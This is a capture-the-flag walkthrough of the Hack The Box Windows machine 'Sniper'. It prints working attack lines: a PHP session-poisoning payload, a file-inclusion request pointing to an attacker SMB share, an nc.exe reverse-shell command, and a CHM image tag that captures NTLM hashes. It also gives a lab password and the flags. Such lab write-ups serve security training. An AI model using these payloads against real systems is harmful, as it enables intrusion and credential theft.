```json
Alias: Sniper
Date: 19-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.229.6
```

# Sniper
# Summary

-  Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion. Command execution is gained on the server in the context of `NT AUTHORITY\iUSR` via local inclusion of maliciously crafted PHP Session files. Exposed database credentials are used to gain access as the user `Chris`, who has the same password. Enumeration reveals that the administrator is reviewing CHM (Compiled HTML Help) files, which can be used the leak the administrators NetNTLM-v2 hash. This can be captured, cracked and used to get a reverse shell as administrator using a PowerShell credential object.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-19 17:38 PKT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.129.229.6
Host is up (0.24s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 6h59m59s
| smb2-time:
|   date: 2024-08-19T19:39:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.01 seconds
```

---
# Enumeration

There is an LFI at `/blog/?lang=` and a login functionality at `/users.
SMB Server is running but no null session.

---

# Exploitation

There are two ways to go about this.
### PHP Session Poisoning
PHP stores session information at `C:\Windows\Temp\sess_<session_id>` in Windows.  They look something like this: `username|s:5:"admin";` Where admin is our username. So if we change our username to something like

```
<?=`powershell whoami`?>
```

We will have command execution. We can use the base64 encoded payload from https://revshells.com  to get a shell.

### SMB

Even if `allow_url_include` is off, we can access an SMB Share using UNC pathing in windows.

Start by setting up an SMB Server.

`smbserver.py -smb2support share $(pwd)`

Create a PHP file in the share

```php
<?php
	//Reverse shell
?>
```

and access it `POST /blog/?lang=//10.10.14.188/share/rce.php`

---

# Lateral Movement

### Chris
in `C:\inetpub\wwwroot\user\db.php` A database password is found. using netexec and trying this password on the user Chris found in `C:\Users` we see that it matches.

| Username | Password         |
| -------- | ---------------- |
| Chris    | 36mEAhz/B8xQ~2VM |
We can get shell as user Chris with `RunasCs.exe`

```
./runas.exe chris '36mEAhz/B8xQ~2VM' "C:\Users\Public\nc.exe 10.10.14.188 1337 -e powershell"
```

---

# Privilege Escalation


## CHM
`C:\Docs` contains a note that asks us to place a report in there. The downloads of Chris contains an instructions.chm file. So I guess we have to create a malicious CHM file and place it in C:\Docs. We can do this by creating a CHM file and placing our smb server in a img tag. So when the user connects we can crack their NTLM hash.

`<img src=\\10.10.14.188\share\test.png />`

## SeImpersonate

Alternatively, The IIS user had seImpersonate privilege so we can use `PrintSpoofer` to get a shell as System. 

---

# Flags
- 74e7a030ea773bcde8349ae10bd96074
- b09e0350baf6998152dbe2a2e4d51e85

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Windows #LFI #PHPSessionPosion #SMB #CTF/ClientSide #Windows/SeImpersonate